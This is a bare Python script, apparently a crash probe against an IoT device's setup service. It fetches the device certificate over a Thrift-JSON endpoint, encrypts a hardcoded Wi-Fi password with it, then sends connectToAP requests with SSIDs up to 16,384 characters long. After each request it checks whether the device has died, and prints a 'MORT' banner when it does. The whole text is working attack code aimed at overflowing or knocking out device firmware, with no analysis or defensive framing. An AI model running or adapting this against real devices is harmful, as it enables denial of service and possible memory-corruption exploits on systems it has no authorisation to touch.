import json, socket, subprocess, time, urllib.request
DEV="10.201.126.241"
def post(p, tmo=45):
    r=urllib.request.Request(f"http://{DEV}:8080/OOBE",
        data=json.dumps(p,separators=(",",":")).encode(),
        headers={"Content-Type":"application/x-thrift"})
    try:
        return urllib.request.urlopen(r,timeout=tmo).read()
    except urllib.error.HTTPError as e:
        return f"HTTP{e.code}".encode()
    except Exception as e:
        return f"EXC:{type(e).__name__}".encode()
def alive(t=4):
    try: s=socket.create_connection((DEV,8080),timeout=t); s.close(); return True
    except: return False
d=json.loads(post([1,"getDeviceDetails",1,1,{}]))
pem=d[4]["0"]["rec"]["5"]["rec"]["1"]["str"]; open("/tmp/c.pem","w").write(pem)
enc=subprocess.run(["openssl","smime","-encrypt","-aes256","-binary","-outform","PEM","/tmp/c.pem"],
                   input=b"password12345", capture_output=True).stdout.decode()
print("cert+password OK")
for n in [32, 256, 1024, 4096, 8192, 16384]:
    ssid="S"*n
    p=[1,"connectToAP",1,1,{"1":{"rec":{"1":{"str":ssid},"2":{"i32":3},"3":{"rec":{"1":{"str":enc}}}}}}]
    r=post(p); ok=alive()
    print(f"  SSID len={n:5} -> {r[:90]!r} alive={ok}")
    if not ok:
        print(f"  ★★★ MORT SSID={n}"); break
    time.sleep(2)
